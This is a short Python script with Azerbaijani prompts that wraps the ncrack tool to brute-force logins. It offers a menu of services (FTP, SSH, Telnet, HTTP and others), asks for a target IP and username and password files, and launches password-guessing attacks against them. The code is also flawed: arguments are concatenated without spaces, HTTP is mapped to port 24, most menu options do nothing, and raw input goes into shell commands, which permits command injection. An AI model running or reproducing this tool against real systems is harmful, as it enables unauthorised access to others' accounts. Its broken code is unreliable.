#!/usr/bin/env python
import os
os.system ("apt-get install figlet")
os.system ("clear")
os.system ("figlet SERT QUVVET ")

print("""
SERT QUVVET  PROGRAMINA XOS GELMISINIZ :) 
HUCUM NOVLERI :
1)FTP
2)SSH
3)TELNET
4)HTTP
5)SMB
6)ROP
7)SIP
8)REDIS
10)POSTEGRESQL
11)MYSQL
""")

emeliyat_no=input("EMELIYAT NOMRESIN YAZIN :")
hedef_ip=input("hedef ip yazin :")
istifadeci_adi=input("istifadeci adi dakument yolu :")
sifre = input("sifrelerin oldugu dokument yolu :")

if (emeliyat_no=="1"):
    os.system("ncrack -p 21 -u " + istifadeci_adi + "-P "+  sifre + " "+ hedef_ip)
elif(emeliyat_no=="2"):
        os.system("ncrack -p 22 -u " + istifadeci_adi + "-P "+  sifre + " "+ hedef_ip)
elif(emeliyat_no=="3"):
        os.system("ncrack -p 23 -u " + istifadeci_adi + "-P "+  sifre + " "+ hedef_ip)     
elif(emeliyat_no=="4"):
        os.system("ncrack -p 24 -u " + istifadeci_adi + "-P "+  sifre + " "+ hedef_ip)     

else :
    print("diger toolalar")